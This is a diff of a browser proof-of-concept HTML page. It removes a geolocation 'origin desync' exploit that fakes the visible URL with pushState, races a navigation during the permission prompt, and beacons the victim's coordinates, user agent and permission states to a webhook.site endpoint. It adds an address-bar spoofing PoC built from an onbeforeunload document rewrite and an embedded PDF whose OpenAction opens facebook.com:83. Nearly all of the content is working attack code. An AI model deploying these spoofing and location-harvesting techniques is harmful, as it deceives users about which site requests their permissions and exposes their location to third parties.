@@ -1,142 +1,41 @@
-<!doctype html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>Geolocation Origin Desync PoC</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-body { margin:0; font-family:-apple-system,BlinkMacSystemFont,system-ui; background:#f5f5f7; }
-button { font-size:15px; padding:10px 14px; border-radius:10px; border:none; background:#007aff; color:#fff; }
-#panel { display:none; max-width:420px; margin:80px auto; background:#fff; padding:24px; border-radius:16px; box-shadow:0 20px 60px rgba(0,0,0,.2); text-align:center; }
-.notice { margin-top:14px; font-size:13px; color:#b00020; }
-</style>
-</head>
-
-<body>
-
-<div style="text-align:center; margin-top:60px;">
-  <button id="trigger">Start PoC</button>
-</div>
-
-<div id="panel">
-  <h2>Request Location</h2>
-  <p>Tap the button below to request Geolocation permission.</p>
-  <button onclick="getLocation()">Get Location</button>
-  <p id="output">Location: -</p>
-  <div class="notice">
-    Demo only — observe origin shown in permission dialog
-  </div>
-</div>
-
 <script>
-const LOG_ENDPOINT = "https://webhook.site/562f0b30-3949-45c2-b3b0-0ac6de5470da";
-
-/* ============================
-   SEMUA TAMBAHAN / LOGGING DI SINI
-   ============================ */
-function logEvent(type, extra = {}) {
-  const data = {
-    type,
-    ts: performance.now().toFixed(3),
-    epoch: Date.now(),
-    url: location.href,
-    origin: location.origin,
-    visibility: document.visibilityState,
-    readyState: document.readyState,
-    ...extra
-  };
-  new Image().src = `${LOG_ENDPOINT}?${new URLSearchParams(data)}`;
-}
-
-function logState(tag) {
-  logEvent(tag, {
-    hasFocus: document.hasFocus(),
-    visibility: document.visibilityState,
-    fullscreen: !!document.fullscreenElement,
-    referrer: document.referrer,
-    ua: navigator.userAgent,
-    platform: navigator.platform,
-    lang: navigator.language
-  });
-}
-
-const panel   = document.getElementById('panel');
-const trigger = document.getElementById('trigger');
-const output  = document.getElementById('output');
-
-function getLocation() {
-  if (!navigator.geolocation) return;
-
-  logState("before_geolocation_request");
-  logEvent("geolocation_requested");
-
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      logEvent("geolocation_success", {
-        lat: pos.coords.latitude,
-        lon: pos.coords.longitude,
-        accuracy: pos.coords.accuracy,
-        timestamp: pos.timestamp
-      });
-      output.textContent = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-    },
-    err => {
-      logEvent("geolocation_error", { code: err.code, message: err.message });
-      output.textContent = 'Permission denied';
-    }
-  );
-}
-
-/* Track focus & visibility */
-document.addEventListener("visibilitychange", () => logEvent("visibility_change", { visibility: document.visibilityState }));
-window.addEventListener("focus", () => logEvent("window_focus"));
-window.addEventListener("blur", () => logEvent("window_blur"));
-
-/* Page lifecycle events */
-["pagehide","beforeunload","freeze","resume"].forEach(ev =>
-  window.addEventListener(ev, () => logEvent("lifecycle_event", { event: ev }))
-);
-
-/* Snapshot permissions */
-if (navigator.permissions) {
-  ["geolocation","notifications"].forEach(p => {
-    try {
-      navigator.permissions.query({ name: p }).then(res => {
-        logEvent("permission_state", { permission: p, state: res.state });
-      });
-    } catch(e){}
-  });
-}
-
-logState("initial_state");
-
-/* ============================
-   ⛔ BAGIAN INI TETAP PALING BAWAH & TIDAK BOLEH DIUBAH ⛔
-   ============================ */
-
-/*
- * Step 1:
- * Manipulate visible URL to a trusted-looking path
- */
-trigger.onclick = () => {
-  history.pushState({}, '', '/trusted');
-  panel.style.display = 'block';
+onbeforeunload=function(){
+	document.write('<b>Welcome to {Some Website}</b>');
+	document.title='OtherWebsite.ltd';
 };
-
-/*
- * Step 2:
- * Trigger a navigation race shortly after permission flow starts
- */
-window.addEventListener('pageshow', () => {
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        location.href = 'https://google.com:9090';
-      }, 80);
-    });
-  });
-});
 </script>
+<embed type="application/pdf" src="data:application/pdf;base64,JVBERi0xLjcKIAp0cmFpbGVyCjw8Ci9Sb290IDEgMCBSCj4+CiAKMSAwIG9iago8PAovVHlwZSAvQ2F0YWxvZwovUGFnZXMgMiAwIFIKL09wZW5BY3Rpb24gMiAwIFIKPj4KZW5kb2JqCiAKMiAwIG9iago8PAovVHlwZSAvQWN0aW9uCi9TIC9VUkkKL1VSSSAoaHR0cDovL3d3dy5mYWNlYm9vay5jb206ODMpCj4+CmVuZG9iagogCiUlRU9G" width="640" height="480">
 
-</body>
-</html>
+
+<!--
+
+Source of the embeded PDF.
+
+-------------------------------------
+%PDF-1.7
+ 
+trailer
+<<
+/Root 1 0 R
+>>
+ 
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/OpenAction 2 0 R
+>>
+endobj
+ 
+2 0 obj
+<<
+/Type /Action
+/S /URI
+/URI (http://www.facebook.com:83)
+>>
+endobj
+ 
+%%EOF
+------------------------------------------ 
+
+-->
